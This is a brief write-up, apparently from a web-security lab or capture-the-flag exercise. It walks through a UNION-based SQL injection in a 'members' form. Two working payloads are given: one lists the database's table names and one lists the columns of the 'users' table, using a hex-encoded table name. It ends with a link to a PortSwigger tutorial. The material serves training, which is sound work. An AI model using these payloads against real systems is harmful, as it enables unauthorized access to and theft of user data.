# SQL

* Go to `members` category
* In the form submit the following which will retrieve database table names:
```
null union select null,table_name from information_schema.tables
```
* Retrieve `users` (or the equivalent hex value `0x7573657273`) table columns
```
null union select null,column_name from information_schema.columns where
 table_name=0x7573657273
```
## Reference
https://portswigger.net/web-security/sql-injection/union-attacks
